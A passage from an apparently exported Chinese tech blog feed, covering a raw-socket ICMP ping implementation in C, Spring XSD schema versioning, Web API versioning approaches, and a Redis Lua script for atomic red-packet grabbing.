class="built_in">sin</span>.sin_addr.s_addr = destination;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">int</span> s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">"socket"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//IP_HDRINCL to tell the kernel that headers are included in the packet</span></span><br><span class="line">	<span class="keyword">if</span> (setsockopt(s, IPPROTO_IP, IP_HDRINCL, <span class="string">"1"</span>,<span class="keyword">sizeof</span>(<span class="string">"1"</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"Error setting IP_HDRINCL"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	sendto(s, sendBuf, <span class="keyword">sizeof</span>(sendBuf), <span class="number">0</span>, (struct sockaddr *) &amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">char</span> responseBuf[<span class="keyword">sizeof</span>(iphdr) + <span class="keyword">sizeof</span>(EchoPacket)] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">receiveAddress</span>;</span></span><br><span class="line">	<span class="keyword">socklen_t</span> len = <span class="keyword">sizeof</span>(receiveAddress);</span><br><span class="line">	<span class="keyword">int</span> reveiveSize = recvfrom(s, (<span class="keyword">void</span>*)responseBuf, <span class="keyword">sizeof</span>(responseBuf), <span class="number">0</span>, (struct sockaddr *) &amp;receiveAddress, &amp;len);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(reveiveSize == <span class="keyword">sizeof</span>(responseBuf))&#123;</span><br><span class="line">		EchoPacket* echoResponse = (EchoPacket*) (responseBuf + <span class="keyword">sizeof</span>(iphdr));</span><br><span class="line">		<span class="comment">//TODO check identifier == pid ?</span></span><br><span class="line">		<span class="keyword">if</span>(echoResponse-&gt;type == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">			gettimeofday(&amp;tv, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">			in_addr tempAddr;</span><br><span class="line">			tempAddr.s_addr = destination;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d bytes from %s : icmp_seq=%d ttl=%d time=%.2f ms\n"</span>,</span><br><span class="line">					<span class="keyword">sizeof</span>(EchoPacket),</span><br><span class="line">					inet_ntoa(tempAddr),</span><br><span class="line">					ntohs(echoResponse-&gt;sequence),</span><br><span class="line">					((iphdr*)responseBuf)-&gt;ttl,</span><br><span class="line">					countMs(echoResponse-&gt;timestamp, tv));</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"response error, type:%d\n"</span>, echoResponse-&gt;type);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error, response size != request size.\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	close(s);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">in_addr_t</span> source = inet_addr(<span class="string">"192.168.1.100"</span>);</span><br><span class="line">	<span class="keyword">in_addr_t</span> destination = inet_addr(<span class="string">"192.168.1.1"</span>);</span><br><span class="line">	<span class="keyword">for</span>(;;)&#123;</span><br><span class="line">		ping(source, destination);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="安全相关的一些东东"><a href="#安全相关的一些东东" class="headerlink" title="安全相关的一些东东"></a>安全相关的一些东东</h2><ul>
<li>死亡之Ping  <a href="http://zh.wikipedia.org/wiki/%E6%AD%BB%E4%BA%A1%E4%B9%8BPing" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/%E6%AD%BB%E4%BA%A1%E4%B9%8BPing</a></li>
</ul>
<p>尽管是很老的漏洞，但是也可以看出协议栈的实现也不是那么的靠谱。</p>
<ul>
<li>Ping flood   <a href="http://en.wikipedia.org/wiki/Ping_flood" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Ping_flood</a></li>
</ul>
<p>服务器关闭ping服务，默认是0,是开启：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在自己实现的过程中，发现有一些蛋疼的地方，如</p>
<p>协议文档不够清晰，得反复对照；</p>
<p>有时候一个小地方处理不对，很难查bug，即使程序能正常工作，但也并不代表它是正确的；</p>
<p>用wireshark可以很方便验证自己写的程序有没有问题。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="http://en.wikipedia.org/wiki/Ping_(networking_utility)" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Ping_(networking_utility)</a></p>
</li>
<li><p><a href="http://en.wikipedia.org/wiki/ICMP_Destination_Unreachable" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/ICMP_Destination_Unreachable</a></p>
</li>
<li><p><a href="http://tools.ietf.org/pdf/rfc792.pdf" target="_blank" rel="noopener">http://tools.ietf.org/pdf/rfc792.pdf</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>ping</tag>
        <tag>network</tag>
        <tag>udp</tag>
        <tag>ICMP</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么在Spring的配置里，最好不要配置xsd文件的版本号</title>
    <url>/spring-xsd/</url>
    <content><![CDATA[<h2 id="为什么dubbo启动没有问题？"><a href="#为什么dubbo启动没有问题？" class="headerlink" title="为什么dubbo启动没有问题？"></a>为什么dubbo启动没有问题？</h2><p>这篇blog源于一个疑问：</p>
<p>我们公司使了阿里的dubbo，但是阿里的开源网站<a href="http://code.alibabatech.com，挂掉有好几个月了，为什么我们的应用启动没有问题？" target="_blank" rel="noopener">http://code.alibabatech.com，挂掉有好几个月了，为什么我们的应用启动没有问题？</a></p>
<p>我们的应用的Spring配置文件里有类似的配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:dubbo</span>=<span class="string">"http://code.alibabatech.com/schema/dubbo"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">	        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">	        http://code.alibabatech.com/schema/dubbo</span></span></span><br><span class="line"><span class="tag"><span class="string">	        http://code.alibabatech.com/schema/dubbo/dubbo.xsd"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们都知道Spring在启动时是要检验XML文件的。或者为什么在Eclipse里xml没有错误提示？<br>比如这样的一个Spring配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们也可以在后面加上版本号：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"&gt;</span><br></pre></td></tr></table></figure>
<p><strong>有这个版本号和没有有什么区别呢？</strong></p>
<h2 id="XML的一些概念"><a href="#XML的一些概念" class="headerlink" title="XML的一些概念"></a>XML的一些概念</h2><p>首先来看下xml的一些概念：</p>
<p>xml的schema里有namespace，可以给它起个别名。比如常见的spring的namespace：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:mvc="http://www.springframework.org/schema/mvc"</span><br><span class="line">xmlns:context="http://www.springframework.org/schema/context"</span><br></pre></td></tr></table></figure>
<p>通常情况下，namespace对应的URI是一个存放XSD的地址，尽管规范没有这么要求。如果没有提供schemaLocation，那么Spring的XML解析器会从namespace的URI里加载XSD文件。我们可以把配置文件改成这个样子，也是可以正常工作的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>schemaLocation提供了一个xml namespace到对应的XSD文件的一个映射，所以我们可以看到，在xsi:schemaLocation后面配置的字符串都是成对的，前面的是namespace的URI，后面是xsd文件的URI。比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xsi:schemaLocation="http://www.springframework.org/schema/beans</span><br><span class="line">http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">http://www.springframework.org/schema/security</span><br><span class="line">http://www.springframework.org/schema/security/spring-security.xsd"</span><br></pre></td></tr></table></figure>
<h2 id="Spring是如何校验XML的"><a href="#Spring是如何校验XML的" class="headerlink" title="Spring是如何校验XML的"></a>Spring是如何校验XML的</h2><p>Spring默认在启动时是要加载XSD文件来验证xml文件的，所以如果有的时候断网了，或者一些开源软件切换域名，那么就很容易碰到应用启动不了。我记得当时Oracle收购Sun公司时，遇到过这个情况。</p>
<p>为了防止这种情况，Spring提供了一种机制，默认从本地加载XSD文件。打开spring-context-3.2.0.RELEASE.jar，可以看到里面有两个特别的文件：</p>
<ul>
<li><p>spring.handlers</p>
  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http\://www.springframework.org/schema/context=org.springframework.context.config.ContextNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/jee=org.springframework.ejb.config.JeeNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/lang=org.springframework.scripting.config.LangNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/task=org.springframework.scheduling.config.TaskNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/cache=org.springframework.cache.config.CacheNamespaceHandler</span><br></pre></td></tr></table></figure>
</li>
<li><p>spring.schemas</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http\://www.springframework.org/schema/context/spring-context-2.5.xsd=org/springframework/context/config/spring-context-2.5.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.0.xsd=org/springframework/context/config/spring-context-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.1.xsd=org/springframework/context/config/spring-context-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.2.xsd=org/springframework/context/config/spring-context-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-3.2.xsd</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>再打开jar包里的org/springframework/context/config/ 目录，可以看到下面有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring-context-2.5.xsd</span><br><span class="line">spring-context-3.0.xsd</span><br><span class="line">spring-context-3.1.xsd</span><br><span class="line">spring-context-3.2.xsd</span><br></pre></td></tr></table></figure>
<p>很明显，可以想到Spring是把XSD文件放到本地了，再在spring.schemas里做了一个映射，优先从本地里加载XSD文件。</p>
<p>并且Spring很贴心，把旧版本的XSD文件也全放了。这样可以防止升级了Spring版本，而配置文件里用的还是旧版本的XSD文件，然后断网了，应用启动不了。</p>
<p>我们还可以看到，在没有配置版本号时，用的就是当前版本的XSD文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http\://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-3.2.xsd</span><br></pre></td></tr></table></figure>
<p>同样，我们打开dubbo的jar包，可以在它的spring.schemas文件里看到有这样的配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http\://code.alibabatech.com/schema/dubbo/dubbo.xsd=META-INF/dubbo.xsd</span><br></pre></td></tr></table></figure>
<p>所以，Spring在加载dubbo时，会从dubbo的jar里加载dubbo.xsd。</p>
<h2 id="如何跳过Spring的XML校验？"><a href="#如何跳过Spring的XML校验？" class="headerlink" title="如何跳过Spring的XML校验？"></a>如何跳过Spring的XML校验？</h2><p>可以用这样的方式来跳过校验：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GenericXmlApplicationContext context = <span class="keyword">new</span> GenericXmlApplicationContext();</span><br><span class="line">context.setValidating(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<h2 id="如何写一个自己的spring-xml-namespace扩展"><a href="#如何写一个自己的spring-xml-namespace扩展" class="headerlink" title="如何写一个自己的spring xml namespace扩展"></a>如何写一个自己的spring xml namespace扩展</h2><p>可以参考Spring的文档，实际上是相当简单的。只要实现自己的NamespaceHandler，再配置一下spring.handlers和spring.schemas就可以了。</p>
<p><a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/html/extensible-xml.html" target="_blank" rel="noopener">http://docs.spring.io/spring/docs/current/spring-framework-reference/html/extensible-xml.html</a></p>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><ul>
<li><p>防止XSD加载不成功的一个思路</p>
<p>  <a href="http://hellojava.info/?p=135" target="_blank" rel="noopener">http://hellojava.info/?p=135</a></p>
</li>
<li><p>齐全的Spring的namespace的列表</p>
<p>  <a href="http://stackoverflow.com/questions/11174286/spring-xml-namespaces-how-do-i-find-what-are-the-implementing-classes-behind-t" target="_blank" rel="noopener">http://stackoverflow.com/questions/11174286/spring-xml-namespaces-how-do-i-find-what-are-the-implementing-classes-behind-t</a></p>
</li>
<li><p>Spring core</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aop - AopNamespaceHandler</span><br><span class="line">c - SimpleConstructorNamespaceHandler</span><br><span class="line">cache - CacheNamespaceHandler</span><br><span class="line">context - ContextNamespaceHandler</span><br><span class="line">jdbc - JdbcNamespaceHandler</span><br><span class="line">jee - JeeNamespaceHandler</span><br><span class="line">jms - JmsNamespaceHandler</span><br><span class="line">lang - LangNamespaceHandler</span><br><span class="line">mvc - MvcNamespaceHandler</span><br><span class="line">oxm - OxmNamespaceHandler</span><br><span class="line">p - SimplePropertyNamespaceHandler</span><br><span class="line">task - TaskNamespaceHandler</span><br><span class="line">tx - TxNamespaceHandler</span><br><span class="line">util - UtilNamespaceHandler</span><br></pre></td></tr></table></figure>
</li>
<li><p>Spring Security</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">security - SecurityNamespaceHandler</span><br><span class="line">oauth - OAuthSecurityNamespaceHandler</span><br></pre></td></tr></table></figure>
</li>
<li><p>Spring integration</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int - IntegrationNamespaceHandler</span><br><span class="line">amqp - AmqpNamespaceHandler</span><br><span class="line">event - EventNamespaceHandler</span><br><span class="line">feed - FeedNamespaceHandler</span><br><span class="line">file - FileNamespaceHandler</span><br><span class="line">ftp - FtpNamespaceHandler</span><br><span class="line">gemfire - GemfireIntegrationNamespaceHandler</span><br><span class="line">groovy - GroovyNamespaceHandler</span><br><span class="line">http - HttpNamespaceHandler</span><br><span class="line">ip - IpNamespaceHandler</span><br><span class="line">jdbc - JdbcNamespaceHandler</span><br><span class="line">jms - JmsNamespaceHandler</span><br><span class="line">jmx - JmxNamespaceHandler</span><br><span class="line">mail - MailNamespaceHandler</span><br><span class="line">redis - RedisNamespaceHandler</span><br><span class="line">rmi - RmiNamespaceHandler</span><br><span class="line">script - ScriptNamespaceHandler</span><br><span class="line">security - IntegrationSecurityNamespaceHandler</span><br><span class="line">sftp - SftpNamespaceHandler</span><br><span class="line">stream - StreamNamespaceHandler</span><br><span class="line">twitter - TwitterNamespaceHandler</span><br><span class="line">ws - WsNamespaceHandler</span><br><span class="line">xml - IntegrationXmlNamespaceHandler</span><br><span class="line">xmpp - XmppNamespaceHandler</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为什么不要在Spring的配置里，配置上XSD的版本号？<br>因为如果没有配置版本号，取的就是当前jar里的XSD文件，减少了各种风险。<br>而且这样约定大于配置的方式很优雅。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://stackoverflow.com/questions/10768873/spring-di-applicationcontext-xml-how-exactly-is-xsischemalocation-used" target="_blank" rel="noopener">http://stackoverflow.com/questions/10768873/spring-di-applicationcontext-xml-how-exactly-is-xsischemalocation-used</a></p>
<p><a href="http://stackoverflow.com/questions/11174286/spring-xml-namespaces-how-do-i-find-what-are-the-implementing-classes-behind-t" target="_blank" rel="noopener">http://stackoverflow.com/questions/11174286/spring-xml-namespaces-how-do-i-find-what-are-the-implementing-classes-behind-t</a></p>
<p><a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/html/extensible-xml.html" target="_blank" rel="noopener">http://docs.spring.io/spring/docs/current/spring-framework-reference/html/extensible-xml.html</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title>Web API 版本控制的几种方式</title>
    <url>/web-api/</url>
    <content><![CDATA[<p><a href="http://www.troyhunt.com/2014/02/your-api-versioning-is-wrong-which-is.html" target="_blank" rel="noopener">http://www.troyhunt.com/2014/02/your-api-versioning-is-wrong-which-is.html</a></p>
<p>这篇文章写得很好，介绍了三种实现web api版本化的三种方式。我从评论里又收集到两种方式，所以一共是5种：</p>
<p>方式一：利用URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP GET:</span><br><span class="line">https://haveibeenpwned.com/api/v2/breachedaccount/foo</span><br></pre></td></tr></table></figure>
<p>方式二：利用用户自定义的request header</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP GET:</span><br><span class="line">https://haveibeenpwned.com/api/breachedaccount/foo</span><br><span class="line">api-version: 2</span><br></pre></td></tr></table></figure>
<p>方式三：利用content type</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP GET:</span><br><span class="line">https://haveibeenpwned.com/api/breachedaccount/foo</span><br><span class="line">Accept: application/vnd.haveibeenpwned.v2+json</span><br></pre></td></tr></table></figure>
<p>方式四：利用content type</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP GET:</span><br><span class="line">https://haveibeenpwned.com/api/breachedaccount/foo</span><br><span class="line">Accept: application/vnd.haveibeenpwned+json; version=2.0</span><br></pre></td></tr></table></figure>
<p>这个方式和方式三的小不同的地方是，把版本号分离出来了。</p>
<p>方式五：利用URL里的parameter</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP GET:</span><br><span class="line">https://haveibeenpwned.com/api/breachedaccount/foo?v=2</span><br></pre></td></tr></table></figure>
<p>作者说他最喜欢第三种方式，因为</p>
<ol>
<li>URL不用改变</li>
<li>客户端应该通过accept header来表明自己想接收的是什么样的数据。</li>
</ol>
<p>但作者很蛋疼地在他的网站上把前面三种方式都实现了，而且都支持。<br><a href="https://haveibeenpwned.com/API/v2" target="_blank" rel="noopener">https://haveibeenpwned.com/API/v2</a></p>
<p>我个人最喜欢的是第二种方式，因为这个用spring mvc实现最容易，也最简洁。</p>
<p>因为只要在Controler上用@RequestMapping标明版本即可。不用再去各种匹配，各种识别。</p>
<p>如果是自己写一个Annotation来识别的话，也要花些功夫，而且怎么无缝地转发到原有的Spring mvc的配置也是个问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(headers=<span class="string">"apt-version=2"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestControllerV2</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外这个网站列举了很多国外的有名网站是如何实现web api版本控制的。</p>
<p><a href="http://www.lexicalscope.com/blog/2012/03/12/how-are-rest-apis-versioned/" target="_blank" rel="noopener">http://www.lexicalscope.com/blog/2012/03/12/how-are-rest-apis-versioned/</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title>利用redis + lua解决抢红包高并发的问题</title>
    <url>/redis-lua-hongbao/</url>
    <content><![CDATA[<h2 id="抢红包的需求分析"><a href="#抢红包的需求分析" class="headerlink" title="抢红包的需求分析"></a>抢红包的需求分析</h2><p>抢红包的场景有点像秒杀，但是要比秒杀简单点。<br>因为秒杀通常要和库存相关。而抢红包则可以允许有些红包没有被抢到，因为发红包的人不会有损失，没抢完的钱再退回给发红包的人即可。<br>另外像小米这样的抢购也要比淘宝的要简单，也是因为像小米这样是一个公司的，如果有少量没有抢到，则下次再抢，人工修复下数据是很简单的事。而像淘宝这么多商品，要是每一个都存在着修复数据的风险，那如果出故障了则很麻烦。</p>
<p>淘宝的专家丁奇有个文章有写到淘宝是如何应对秒杀的：《秒杀场景下MySQL的低效–原因和改进》</p>
<p><a href="http://blog.nosqlfan.com/html/4209.html" target="_blank" rel="noopener">http://blog.nosqlfan.com/html/4209.html</a></p>
<h2 id="基于redis的抢红包方案"><a href="#基于redis的抢红包方案" class="headerlink" title="基于redis的抢红包方案"></a>基于redis的抢红包方案</h2><p>下面介绍一种基于redis的抢红包方案。</p>
<p>把原始的红包称为大红包，拆分后的红包称为小红包。</p>
<ol>
<li><p>小红包预先生成，插到数据库里，红包对应的用户ID是null。生成算法见另一篇blog：<a href="http://blog.csdn.net/hengyunabc/article/details/19177877" target="_blank" rel="noopener">http://blog.csdn.net/hengyunabc/article/details/19177877</a></p>
</li>
<li><p>每个大红包对应两个redis队列，一个是未消费红包队列，另一个是已消费红包队列。开始时，把未抢的小红包全放到未消费红包队列里。</p>
<p> 未消费红包队列里是json字符串，如<code>{userId:&#39;789&#39;, money:&#39;300&#39;}</code>。</p>
</li>
<li><p>在redis中用一个map来过滤已抢到红包的用户。</p>
</li>
<li><p>抢红包时，先判断用户是否抢过红包，如果没有，则从未消费红包队列中取出一个小红包，再push到另一个已消费队列中，最后把用户ID放入去重的map中。</p>
</li>
<li><p>用一个单线程批量把已消费队列里的红包取出来，再批量update红包的用户ID到数据库里。</p>
</li>
</ol>
<p>上面的流程是很清楚的，但是在第4步时，如果是用户快速点了两次，或者开了两个浏览器来抢红包，会不会有可能用户抢到了两个红包？</p>
<p>为了解决这个问题，采用了lua脚本方式，让第4步整个过程是原子性地执行。</p>
<p>下面是在redis上执行的Lua脚本：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 函数：尝试获得红包，如果成功，则返回json字符串，如果不成功，则返回空</span></span><br><span class="line"><span class="comment">-- 参数：红包队列名， 已消费的队列名，去重的Map名，用户ID</span></span><br><span class="line"><span class="comment">-- 返回值：nil 或者 json字符串，包含用户ID：userId，红包ID：id，红包金额：money</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">-- 如果用户已抢过红包，则返回nil</span></span><br><span class="line"><span class="keyword">if</span> redis.call(<span class="string">'hexists'</span>, KEYS[<span class="number">3</span>], KEYS[<span class="number">4</span>]) ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="comment">-- 先取出一个小红包</span></span><br><span class="line">  <span class="keyword">local</span> hongBao = redis.call(<span class="string">'rpop'</span>, KEYS[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> hongBao <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> x = cjson.decode(hongBao);</span><br><span class="line">    <span class="comment">-- 加入用户ID信息</span></span><br><span class="line">    x[<span class="string">'userId'</span>] = KEYS[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">local</span> re = cjson.encode(x);</span><br><span class="line">    <span class="comment">-- 把用户ID放到去重的set里</span></span><br><span class="line">    redis.call(<span class="string">'hset'</span>, KEYS[<span class="number">3</span>], KEYS[<span class="number">4</span>], KEYS[<span class="number">4</span>]);</span><br><span class="line">    <span class="comment">-- 把红包放到已消费队列里</span></span><br><span class="line">    redis.call(<span class="string">'lpush'</span>, KEYS[<span class="number">2</span>], re);</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br></pre></td></tr></table></figure>
<p>下面是测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestEval</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> String host = <span class="string">"localhost"</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> honBaoCount = <span class="number">1_0_0000</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> threadCount = <span class="number">20</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">static</span> String hongBaoList = <span class="string">"hongBaoList"</span>;</span><br><span class="line">	<span class="keyword">static</span> String hongBaoConsumedList = <span class="string">"hongBaoConsumedList"</span>;</span><br><span class="line">	<span class="keyword">static</span> String hongBaoConsumedMap = <span class="string">"hongBaoConsumedMap"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">static</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line"><span class="comment">//	-- 函数：尝试获得红包，如果成功，则返回json字符串，如果不成功，则返回空</span></span><br><span class="line"><span class="comment">//	-- 参数：红包队列名， 已消费的队列名，去重的Map名，用户ID</span></span><br><span class="line"><span class="comment">//	-- 返回值：nil 或者 json字符串，包含用户ID：userId，红包ID：id，红包金额：money</span></span><br><span class="line">	<span class="keyword">static</span> String tryGetHongBaoScript = </span><br><span class="line"><span class="comment">//			"local bConsumed = redis.call('hexists', KEYS[3], KEYS[4]);\n"</span></span><br><span class="line"><span class="comment">//			+ "print('bConsumed:' ,bConsumed);\n"</span></span><br><span class="line">			<span class="string">"if redis.call('hexists', KEYS[3], KEYS[4]) ~= 0 then\n"</span></span><br><span class="line">			+ <span class="string">"return nil\n"</span></span><br><span class="line">			+ <span class="string">"else\n"</span></span><br><span class="line">			+ <span class="string">"local hongBao = redis.call('rpop', KEYS[1]);\n"</span></span><br><span class="line"><span class="comment">//			+ "print('hongBao:', hongBao);\n"</span></span><br><span class="line">			+ <span class="string">"if hongBao then\n"</span></span><br><span class="line">			+ <span class="string">"local x = cjson.decode(hongBao);\n"</span></span><br><span class="line">			+ <span class="string">"x['userId'] = KEYS[4];\n"</span></span><br><span class="line">			+ <span class="string">"local re = cjson.encode(x);\n"</span></span><br><span class="line">			+ <span class="string">"redis.call('hset', KEYS[3], KEYS[4], KEYS[4]);\n"</span></span><br><span class="line">			+ <span class="string">"redis.call('lpush', KEYS[2], re);\n"</span></span><br><span class="line">			+ <span class="string">"return re;\n"</span></span><br><span class="line">			+ <span class="string">"end\n"</span></span><br><span class="line">			+ <span class="string">"end\n"</span></span><br><span class="line">			+ <span class="string">"return nil"</span>;</span><br><span class="line">	<span class="keyword">static</span> StopWatch watch = <span class="keyword">new</span> StopWatch();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"><span class="comment">//		testEval();</span></span><br><span class="line">		generateTestData();</span><br><span class="line">		testTryGetHongBao();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span 